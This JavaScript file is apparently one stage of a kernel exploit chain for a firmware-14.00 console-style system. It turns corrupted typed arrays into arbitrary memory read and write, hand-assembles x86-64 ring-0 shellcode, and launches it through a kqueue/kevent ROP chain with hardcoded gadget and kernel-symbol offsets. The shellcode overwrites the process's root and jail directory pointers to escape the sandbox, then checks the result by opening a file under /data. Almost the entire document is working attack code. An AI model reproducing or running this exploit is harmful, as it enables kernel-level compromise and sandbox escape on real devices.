// Stage PRISON v1: escape the sandbox with ring-0 shellcode.
//
// After stage_patch_v1 the kernel carries the 1400.bin patch set and the RWX
// page is executable. This probe runs a small stub that:
//
//   rbx = [allproc]                    ; first struct proc
//   walk p_list.le_next until p_pid == pid
//   pfd = [proc + 0x48]                ; p_fd
//   rootvnode = [kbase + 0x2136E90]
//   [pfd + 0x10/0x18/0x20] = rootvnode ; fd_cdir / fd_rdir / fd_jdir
//   [ucred + 0x30] = kbase + 0x111FA18 ; cr_prison = prison0
//   write a marker to fake+0x1A00 and return
//
// and then verifies the result by reading the fields back. It also tries
// open("/data/jb_probe.txt", O_CREAT|O_RDWR) before and after the escape; a
// failure before and a success after is the functional proof.
//
// Addresses (14.00): ALLPROC=0x1B28538, ROOTVNODE=0x2136E90, PRISON0=0x111FA18.
var result, n, f, dv, saved, phase = "preflight";
var st = null, su = null, jit = null, fake = 0, ops = 0, gSTACK = 0, gRES = 0;
var gMARK = 0, gCTX = 0, gDUMP = 0, gMARK2 = 0, gUDUMP = 0, rwx = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var KBASE_LO = 0, pid = 0, ucredBytes = null;
var R_RET0 = 0x349ee, R_TOUCH = 0x73e886;
var R_POPRSP = 0x1c9dc, R_SAVE = 0x2be040, R_REST = 0x2be070;
var R_CONT = 0xe4f40, R_PRAX = 0x1ca05, R_PRDX = 0x184ab2;
var R_PRDI = 0x3b0a2a, R_LDRAX = 0x6aaf3, R_ADDRAX = 0x3fc327;
var R_STRDIRAX = 0x2f1cb;
var R_ALLPROC = 0x1b28538, R_ROOTVNODE = 0x2136e90, R_PRISON0 = 0x111fa18;
var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
var MARK = [49, 74, 84, 79, 79, 82, 77, 77];
var GIDENT = [49, 90, 84, 82, 80, 75, 52, 49];
var M120 = [136, 255, 255, 255, 255, 255, 255, 255];
var MARKERB = [0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11];
var FAILB = [0xbe, 0xba, 0xfe, 0xca, 0xef, 0xbe, 0xad, 0xde];
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageF;
  su = window.__fw14StageU;
  jit = window.__fw14StageJit;
  if (!st || typeof st.fake !== "number" || typeof st.ops !== "number" ||
      typeof st.gSTACK !== "number" || typeof st.gMARK !== "number" ||
      typeof st.gCTX !== "number")
    throw new Error("stage_f_state_missing");
  if (!su || !su.ucred || su.ucred.length !== 8)
    throw new Error("stage_u_state_missing");
  if (!jit || typeof jit.addr !== "number" || jit.addr <= 0)
    throw new Error("stage_jit_state_missing");
  rwx = jit.addr;
  ucredBytes = su.ucred.slice();
  KBASE_LO = st.kbaseLo || window.__fw14KbaseLo;
  if (!Number.isInteger(KBASE_LO) || KBASE_LO <= 0 || KBASE_LO > 0xffffffff)
    throw new Error("kbase_missing");
  var need = ["kevent", "kqueue", "getpid"];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number")
      throw new Error("wrappers_missing_" + need[mi]);
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  ops = st.ops;
  gSTACK = st.gSTACK;
  gRES = st.gRES;
  gMARK = st.gMARK;
  gCTX = st.gCTX;
  gDUMP = st.gDUMP || (fake + 6400);
  gMARK2 = fake + 0x1a00;
  gUDUMP = fake + 0x1c00;   // 32-qword ucred dump, clear of gMARK2

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var v = 0;
    for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
    return v;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  carrierSlot = addressOf(carrier) - base + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = isBytes(addr) ? addr : pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function pokeQ(addr, bytes) { poke(addr, bytes); }
  function peekQ(addr) { return peek(addr, 8); }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== (right[i] & 255)) return false;
    return true;
  }
  function kq(rva) {
    var lo = KBASE_LO + rva;
    if (lo > 0xffffffff) throw new Error("kva_overflow_" + rva);
    return [lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255,
            (lo >>> 24) & 255, 0xff, 0xff, 0xff, 0xff];
  }
  function u64b(value) { return pointerBytes(value); }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex16(bytes) {
    var out = "";
    for (var i = 7; i >= 0; i--)
      out += ("0" + (bytes[i] & 255).toString(16)).slice(-2);
    return out;
  }
  function isBytes(v) { return v && typeof v === "object" && v.length === 8; }
  function addBytes(bytes, delta) {
    var out = bytes.slice(0), carry = delta;
    for (var i = 0; i < 8 && carry > 0; i++) {
      var v = out[i] + (carry % 256);
      out[i] = v & 255;
      carry = Math.floor(carry / 256) + (v >> 8);
    }
    return out;
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  // ------------------------------------------------- tiny x86-64 assembler
  function buildStub() {
    var code = [], labels = {}, fixups = [];
    function emit() {
      for (var i = 0; i < arguments.length; i++) code.push(arguments[i] & 255);
    }
    function imm64(bytes) {
      if (!isBytes(bytes)) bytes = u64b(bytes);
      for (var i = 0; i < 8; i++) code.push(bytes[i] & 255);
    }
    function imm32(v) {
      for (var i = 0; i < 4; i++) code.push(Math.floor(v / Math.pow(2, 8 * i)) & 255);
    }
    function label(name) { labels[name] = code.length; }
    // near (rel32) conditional jumps: the stub outgrew rel8
    function jcc(kind, name) {
      if (kind === "jz") code.push(0x0f, 0x84);
      else if (kind === "jne") code.push(0x0f, 0x85);
      else if (kind === "jmp") code.push(0xe9);
      else throw new Error("jcc_kind_" + kind);
      fixups.push({ at: code.length, name: name });
      for (var i = 0; i < 4; i++) code.push(0);
    }
    // top 16 bits must be 0xffff (a kernel pointer), else bail out
    function kptrCheck(reg) {
      if (reg === "rax") emit(0x48, 0x89, 0xc1);
      else if (reg === "rdi") emit(0x48, 0x89, 0xf9);
      else if (reg === "rbx") emit(0x48, 0x89, 0xd9);
      else if (reg === "rsi") emit(0x48, 0x89, 0xf1);
      else throw new Error("kptr_reg_" + reg);
      emit(0x48, 0xc1, 0xe9, 0x30);           // shr rcx, 48
      emit(0x81, 0xf9, 0xff, 0xff, 0x00, 0x00); // cmp ecx, 0xffff
      jcc("jne", "fail");                     // jne fail
    }
    emit(0x48, 0xbb); imm64(kq(R_ALLPROC));   // movabs rbx, allproc
    emit(0x48, 0x8b, 0x1b);                   // mov rbx, [rbx]
    label("loop");
    emit(0x48, 0x85, 0xdb);                   // test rbx, rbx
    jcc("jz", "fail");
    kptrCheck("rbx");
    emit(0x81, 0xbb, 0xb0, 0x00, 0x00, 0x00); // cmp dword [rbx+0xb0], pid
    imm32(pid);
    jcc("jz", "found");
    emit(0x48, 0x8b, 0x1b);                   // mov rbx, [rbx]
    jcc("jmp", "loop");
    label("found");
    emit(0x48, 0x8b, 0x7b, 0x48);             // mov rdi, [rbx+0x48]  p_fd
    emit(0x48, 0x85, 0xff);                   // test rdi, rdi
    jcc("jz", "fail");
    kptrCheck("rdi");
    // p_ucred must be exactly the cred stage_uid_v1 patched. This validates
    // both p_ucred(+0x40) and that the pid match found the right proc.
    emit(0x48, 0x8b, 0x73, 0x40);             // mov rsi, [rbx+0x40]
    emit(0x48, 0x85, 0xf6);                   // test rsi, rsi
    jcc("jz", "fail");
    kptrCheck("rsi");
    emit(0x48, 0xb9); imm64(ucredBytes);      // movabs rcx, expected ucred
    emit(0x48, 0x39, 0xce);                   // cmp rsi, rcx
    jcc("jne", "fail");
    // Read-only dump of 32 ucred qwords. The live boot-6 dump showed +0x30
    // holds a kernel-text pointer, not &prison0 (which must end in 0xA18),
    // so this probe does NOT write cr_prison: the reference escapes with
    // p_fd only. The dump lets us find the real cr_prison field if the
    // p_fd-only escape is not enough.
    emit(0x48, 0xba); imm64(u64b(gUDUMP));    // movabs rdx, gUDUMP
    for (var ui = 0; ui < 32; ui++) {
      emit(0x48, 0x8b, 0x86); imm32(ui * 8);  // mov rax, [rsi+disp]
      emit(0x48, 0x89, 0x82); imm32(ui * 8);  // mov [rdx+disp], rax
    }
    emit(0x48, 0xba); imm64(u64b(gDUMP));     // movabs rdx, gDUMP
    emit(0x48, 0x89, 0x3a);                   // mov [rdx], rdi
    emit(0x48, 0x89, 0x5a, 0x08);             // mov [rdx+8], rbx
    emit(0x48, 0x89, 0x72, 0x40);             // mov [rdx+0x40], rsi
    // the existing fd_cdir must be a canonical vnode, else p_fd is not a
    // filedesc and the three writes below would corrupt memory
    emit(0x48, 0x8b, 0x47, 0x10);             // mov rax, [rdi+0x10]
    emit(0x48, 0x85, 0xc0);                   // test rax, rax
    jcc("jz", "fail");
    kptrCheck("rax");
    emit(0x48, 0x89, 0x42, 0x48);             // mov [rdx+0x48], rax
    emit(0x48, 0xbb); imm64(kq(R_ROOTVNODE)); // movabs rbx, rootvnode global
    emit(0x48, 0x8b, 0x03);                   // mov rax, [rbx]
    emit(0x48, 0x85, 0xc0);                   // test rax, rax
    jcc("jz", "fail");
    kptrCheck("rax");
    emit(0x48, 0x89, 0x42, 0x10);             // mov [rdx+0x10], rax
    emit(0x48, 0x89, 0x47, 0x10);             // mov [rdi+0x10], rax  fd_cdir
    emit(0x48, 0x89, 0x47, 0x18);             // mov [rdi+0x18], rax  fd_rdir
    emit(0x48, 0x89, 0x47, 0x20);             // mov [rdi+0x20], rax  fd_jdir
    // read the fields back inside ring 0 and copy them to gDUMP: userland
    // must never dereference these kernel addresses itself.
    emit(0x48, 0x8b, 0x47, 0x10);             // mov rax, [rdi+0x10]
    emit(0x48, 0x89, 0x42, 0x28);             // mov [rdx+0x28], rax
    emit(0x48, 0x8b, 0x47, 0x18);             // mov rax, [rdi+0x18]
    emit(0x48, 0x89, 0x42, 0x30);             // mov [rdx+0x30], rax
    emit(0x48, 0x8b, 0x47, 0x20);             // mov rax, [rdi+0x20]
    emit(0x48, 0x89, 0x42, 0x38);             // mov [rdx+0x38], rax
    emit(0x48, 0xba); imm64(u64b(gMARK2));    // movabs rdx, gMARK2
    emit(0x48, 0xb9); imm64(MARKERB);         // movabs rcx, marker
    emit(0x48, 0x89, 0x0a);                   // mov [rdx], rcx
    emit(0x31, 0xc0);                         // xor eax, eax
    emit(0xc3);                               // ret
    label("fail");
    emit(0x48, 0xba); imm64(u64b(gMARK2));    // movabs rdx, gMARK2
    emit(0x48, 0xb9); imm64(FAILB);           // movabs rcx, fail marker
    emit(0x48, 0x89, 0x0a);                   // mov [rdx], rcx
    emit(0x31, 0xc0);
    emit(0xc3);
    for (var i = 0; i < fixups.length; i++) {
      var fx = fixups[i], target = labels[fx.name];
      var rel = target - (fx.at + 4);
      for (var bi2 = 0; bi2 < 4; bi2++) {
        code[fx.at + bi2] = Math.floor(rel / Math.pow(2, 8 * bi2)) & 255;
      }
    }
    return code;
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  pid = pidRes.value;

  // ------------------------------------------- re-install fake filterops
  phase = "ops";
  pokeQ(ops, Z8);
  pokeQ(ops + 8, kq(R_RET0));
  pokeQ(ops + 16, kq(R_RET0));
  pokeQ(ops + 24, kq(R_RET0));
  pokeQ(ops + 32, kq(R_TOUCH));
  var opsOk = same(peekQ(ops + 32), kq(R_TOUCH));

  // ------------------------------------------------ kqueue + initial add
  phase = "kqueue";
  var kqRes = n.call("kqueue", []);
  if (kqRes.value < 0) throw new Error("kqueue" + eTag(kqRes));
  var kqFd = kqRes.value;

  f.fill(0, 0x900, 0x940);
  for (var gi = 0; gi < 8; gi++) f[0x900 + gi] = GIDENT[gi];
  dv.setInt16(0x908, -23, true);
  dv.setUint16(0x90a, 1, true);
  phase = "initial_add";
  mark("pr_initial_add");
  var addRes = n.call("kevent",
    [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);

  // ------------------------------------------------------- chain builder
  function makeChain(extra) {
    var chain = [];
    function emit(b) { chain.push(b); }
    function emitU(v) { emit(isBytes(v) ? v : u64b(v)); }
    function kb1() {
      emit(kq(R_PRAX)); emit(MARK);
      emit(kq(R_PRDI)); emitU(gMARK);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emitU(gCTX + 16);
      emit(kq(R_LDRAX)); emitU(0);
      emit(kq(R_PRDX)); emit(M120);
      emit(kq(R_ADDRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX + 8);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emit(kq(R_CONT));
      emit(kq(R_PRDI)); emitU(gCTX + 56);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX);
      emit(kq(R_REST));
    }
    emit(kq(R_PRDI)); emitU(gCTX); emit(kq(R_SAVE));
    extra(emit, emitU);
    kb1();
    var bytes = [];
    for (var qi = 0; qi < chain.length; qi++)
      for (var bi = 0; bi < 8; bi++) bytes.push(chain[qi][bi]);
    if (chain.length > 112) throw new Error("chain_long_" + chain.length);
    return { bytes: bytes, qwords: chain.length };
  }
  function fire(chain) {
    poke(gSTACK, chain.bytes);
    pokeQ(gMARK, Z8);
    pokeQ(gMARK2, Z8);
    f.fill(0, 0x900, 0x940);
    for (var gi2 = 0; gi2 < 8; gi2++) f[0x900 + gi2] = GIDENT[gi2];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 1, true);
    var poprsp = kq(R_POPRSP);
    for (var pi = 0; pi < 8; pi++) f[0x920 + pi] = poprsp[pi];
    var stackB = u64b(gSTACK);
    for (var si = 0; si < 8; si++) f[0x928 + si] = stackB[si];
    var rc = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 2, 0, 0, 0]);
    return { rc: rc, mark: same(peekQ(gMARK), MARK) };
  }

  // ------------------------------------- functional probe: /data access
  var PATH_ADDR = fake + 0x1b00, MSG_ADDR = fake + 0x1b20, BUF_ADDR = fake + 0x1b40;
  var pathBytes = [];
  var path = "/data/jb_probe.txt";
  for (var pi2 = 0; pi2 < path.length; pi2++) pathBytes.push(path.charCodeAt(pi2));
  pathBytes.push(0);
  var canOpen = typeof n.wrappers.open === "number";
  function tryOpen() {
    if (!canOpen) return { tag: "na", fd: -1 };
    poke(PATH_ADDR, pathBytes);
    var r = n.call("open", [PATH_ADDR, 0x202, 0x1a4]);
    return { tag: eTag(r), fd: isErr(r) ? -1 : r.value };
  }
  phase = "open_before";
  mark("pr_open_before");
  var openBefore = tryOpen();

  // ------------------------------------------- write and run the stub
  var stub = buildStub();
  phase = "stub";
  mark("pr_stub");
  poke(rwx, stub);
  var stubOk = same(peek(rwx, stub.length), stub);
  var execOk = false;
  if (stubOk) {
    phase = "exec";
    mark("pr_exec");
    var eRes = fire(makeChain(function (emit) { emit(u64b(rwx)); }));
    execOk = eRes.mark;
  }

  // ------------------------------------------------ verify the result
  var markerOk = false, dump = [], structOk = false, prisonRb = null;
  var pfdRb = null, openAfter = { tag: "-", fd: -1 };
  var ucredOk = false, oldCdir = null, prisonField = "none";
  if (execOk) {
    markerOk = same(peekQ(gMARK2), MARKERB);
    dump = [peekQ(gDUMP), peekQ(gDUMP + 8), peekQ(gDUMP + 16), peekQ(gDUMP + 24)];
    var prison0B = kq(R_PRISON0);
    // gDUMP+0x20..0x38 are the ring-0 readbacks of ucred+0x30 and pfd+0x10/18/20
    pfdRb = [peekQ(gDUMP + 0x28), peekQ(gDUMP + 0x30), peekQ(gDUMP + 0x38)];
    // +0x40 = p_ucred the stub saw, +0x48 = fd_cdir before the write
    ucredOk = same(peekQ(gDUMP + 0x40), ucredBytes);
    oldCdir = peekQ(gDUMP + 0x48);
    structOk = ucredOk &&
      same(pfdRb[0], dump[2]) && same(pfdRb[1], dump[2]) && same(pfdRb[2], dump[2]);
    // which ucred field, if any, holds &prison0?
    for (var pi3 = 0; pi3 < 32; pi3++) {
      if (same(peekQ(gUDUMP + pi3 * 8), prison0B)) {
        prisonField = "+0x" + (pi3 * 8).toString(16);
        break;
      }
    }
    phase = "open_after";
    mark("pr_open_after");
    openAfter = tryOpen();
  }

  // ------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var escaped = execOk && markerOk && structOk;
  window.__fw14StagePrison = {
    escaped: escaped, rwx: rwx, ucred: ucredBytes, pid: pid,
    pfd: dump[0] || null, rootvnode: dump[2] || null, kbaseLo: KBASE_LO
  };
  result = {
    id: "stage_prison_v1",
    status: (escaped && intact) ? "pass" : "fail",
    details: {
      pid: pid,
      ops: (opsOk ? "ok" : "bad") + "/kq" + kqFd + "/add" + eTag(addRes),
      stub: stubOk ? "ok/" + stub.length : "bad",
      exec: execOk ? "ok" : "no",
      marker: markerOk ? "ok" : hex16(peekQ(gMARK2)),
      ucred: ucredOk ? "ok" : "bad",
      // the harness rejects more than 12 detail fields, so the four pointers
      // share one field
      prison: prisonField,
      ptrs: "pfd:" + (dump[0] ? hex16(dump[0]).slice(-8) : "-") +
            "/proc:" + (dump[1] ? hex16(dump[1]).slice(-8) : "-") +
            "/rootvn:" + (dump[2] ? hex16(dump[2]).slice(-8) : "-"),
      struct: structOk ? "ok" : "bad",
      open: (openBefore.tag + "->" + openAfter.tag),
      state: escaped ? "escaped" : (execOk ? "partial" : "dead"),
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_prison_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
